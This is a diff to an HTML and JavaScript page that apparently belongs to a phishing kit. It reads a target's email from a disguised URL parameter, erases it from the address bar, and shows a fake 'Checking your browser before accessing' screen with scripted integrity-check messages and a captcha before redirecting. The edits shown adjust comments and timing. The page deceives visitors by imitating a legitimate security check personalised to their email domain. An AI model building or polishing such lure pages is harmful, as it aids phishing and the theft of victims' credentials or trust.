@@ -24,6 +24,7 @@
     height: 100%;
     z-index: 9998;
     background: white;
+    opacity: 1;
     transition: opacity 1s ease;
   }
 
@@ -81,7 +82,9 @@
 <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
 <script>
-/* GET EMAIL AND DOMAIN */
+/* ===============================
+   GET EMAIL AND DOMAIN
+================================ */
 function getEmailRaw() {
   const params = new URLSearchParams(window.location.search);
   return params.get("bazz505") || "";
@@ -95,7 +98,9 @@ history.replaceState({}, document.title, window.location.pathname);
 const title = document.getElementById("domain-title");
 if (domain) title.textContent = `Checking your browser before accessing ${domain}`;
 
-/* SECURITY MESSAGE CYCLE */
+/* ===============================
+   SECURITY MESSAGE CYCLE
+================================ */
 const securityMsg = document.getElementById("security-msg");
 const messages = [
   "Performing browser integrity check...",
@@ -105,21 +110,24 @@ const messages = [
 ];
 const MESSAGE_INTERVAL = 1500; // ms per message
 
-/* VIDEO AND OVERLAY CONTROL */
+/* ===============================
+   VIDEO AND OVERLAY CONTROL
+================================ */
 const introVideoDiv = document.getElementById("intro-video");
 const verificationOverlay = document.getElementById("verification-overlay");
 
-const VIDEO_DURATION = 8000; // ms
+const VIDEO_DURATION = 7000; // Adjust video duration here (ms)
+const OVERLAY_FADEIN_BEFORE_END = 1000; // Overlay starts 1s before video ends
 
-// Start overlay and message cycle
 setTimeout(() => {
+  // Start crossfade: video fades out, overlay fades in
   verificationOverlay.classList.add("active");
-
-  // Fade out video
   introVideoDiv.style.opacity = "0";
+
+  // Remove video after fade
   setTimeout(() => introVideoDiv.remove(), 1000);
 
-  // Cycle messages
+  // Start message cycle
   messages.forEach((msg, i) => {
     setTimeout(() => {
       securityMsg.textContent = msg;
@@ -129,7 +137,7 @@ setTimeout(() => {
   // Total time for all messages
   const totalMessageTime = MESSAGE_INTERVAL * messages.length;
 
-  // Fade out overlay after messages finish
+  // Fade out overlay after all messages are done
   setTimeout(() => {
     if (!verificationOverlay.classList.contains("fade-out")) {
       verificationOverlay.classList.add("fade-out");
@@ -139,9 +147,11 @@ setTimeout(() => {
     }
   }, totalMessageTime);
 
-}, VIDEO_DURATION - 1000); // start overlay 1s before video ends
+}, VIDEO_DURATION - OVERLAY_FADEIN_BEFORE_END);
 
-// CAPTCHA success immediately fades overlay and redirects
+/* ===============================
+   CAPTCHA SUCCESS
+================================ */
 window.onCaptchaSuccess = () => {
   verificationOverlay.classList.add("fade-out");
   setTimeout(() => {
